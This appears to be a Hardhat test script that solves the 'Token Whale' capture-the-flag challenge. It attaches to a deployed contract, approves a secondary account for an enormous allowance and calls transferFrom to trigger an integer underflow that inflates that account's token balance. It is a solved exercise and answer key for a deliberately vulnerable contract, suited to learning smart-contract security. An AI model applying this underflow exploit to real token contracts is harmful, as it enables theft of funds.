import { ethers } from "hardhat";
import { expect } from "chai";
import { utils } from "ethers";


describe("tokenwhale", function() {
    it("Should solve the token whale challenge", async function() {
        this.timeout(0);

        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let secondary = accounts[1];
        let balance = [await eoa.getBalance(), await secondary.getBalance() ];
        console.log(utils.formatEther(balance[0]) + "-" + utils.formatEther(balance[1]));

        const factory = await ethers.getContractFactory("TokenWhaleChallenge");
        // const target = await factory.deploy(eoa.address);
        const target = factory.attach("0xDebEDc68662BBEAD69a4a456a44640Fd4b4d374F");
        const targetSecondary = target.connect(secondary); 

        console.log("Calling approve");
        let tx = await target.approve(secondary.address, ethers.BigNumber.from(2).pow(255));
        await tx.wait();

        console.log("Calling transferFrom");
        tx = await targetSecondary.transferFrom(eoa.address, eoa.address, 1);
        await tx.wait();

        console.log("Checking secondary's tokens");
        let hugeBalance = await target.balanceOf(secondary.address);
        expect(hugeBalance).to.be.gt(1000);

        console.log("Get enough token to complete");
        tx = await targetSecondary.transfer(eoa.address, 1500000);
    });
});